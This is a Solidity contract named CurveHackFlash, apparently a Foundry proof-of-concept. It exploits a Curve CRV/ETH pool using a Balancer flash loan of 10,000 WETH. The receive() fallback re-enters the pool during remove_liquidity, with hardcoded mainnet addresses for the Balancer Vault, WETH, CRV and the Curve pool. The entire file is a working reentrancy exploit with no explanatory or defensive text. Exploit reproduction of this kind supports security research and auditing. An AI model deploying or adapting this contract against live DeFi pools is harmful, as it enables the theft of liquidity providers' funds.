// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import { IERC20 } from "./interfaces/IERC20.sol";
import { WETH } from "./interfaces/WETH.sol";
import { IVault } from "./interfaces/balancer/IVault.sol";
import { CurvePool } from "./interfaces/curve/CurvePool.sol";
import { IFlashLoanRecipient } from "./interfaces/balancer/IFlashLoanRecipient.sol";

import "forge-std/console2.sol";

contract CurveHackFlash is IFlashLoanRecipient {
    IVault private constant vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); // Balancer Vault

    WETH private constant xWETH = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);

    CurvePool private constant crvEthCurvePool = CurvePool(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
    IERC20 private constant crvEthPoolToken = IERC20(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d);

    uint256 activateFallback = 0;

    function makeFlashLoan() external payable {
        CRV.approve(address(crvEthCurvePool), type(uint256).max);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(xWETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;

        vault.flashLoan(this, tokens, amounts, "0x");

        _printTokens();
    }

    receive() external payable {
        if (activateFallback == 1) {
            crvEthCurvePool.add_liquidity{ value: 400 ether }([uint256(400 ether), 0], 1, true);
            crvEthCurvePool.exchange{ value: 500 ether }(0, 1, 500 ether, 1, true);
        }
    }

    function _printTokens() internal view {
        console2.log("ETH: %s", address(this).balance);
        console2.log("WETH: %s", xWETH.balanceOf(address(this)));
        console2.log("CRV: %s", CRV.balanceOf(address(this)));
        console2.log("Curve LPT: %s", crvEthPoolToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory, bytes memory)
        external
    {
        require(msg.sender == address(vault));

        xWETH.withdraw(xWETH.balanceOf(address(this)));

        crvEthCurvePool.add_liquidity{ value: 400 ether }([uint256(400 ether), 0], 1, true);

        _printTokens();

        crvEthPoolToken.approve(address(crvEthCurvePool), type(uint256).max);

        activateFallback = 1;
        crvEthCurvePool.remove_liquidity(crvEthPoolToken.balanceOf(address(this)), [uint256(0), 0], true);
        activateFallback = 0;

        _printTokens();

        crvEthCurvePool.remove_liquidity_one_coin(crvEthPoolToken.balanceOf(address(this)), 0, 0, true);

        _printTokens();

        crvEthCurvePool.exchange(1, 0, CRV.balanceOf(address(this)), 0, true);

        _printTokens();

        xWETH.deposit{ value: address(this).balance }();

        for (uint256 i = 0; i < tokens.length;) {
            tokens[i].transfer(address(vault), amounts[i]);

            unchecked {
                ++i;
            }
        }
    }
}
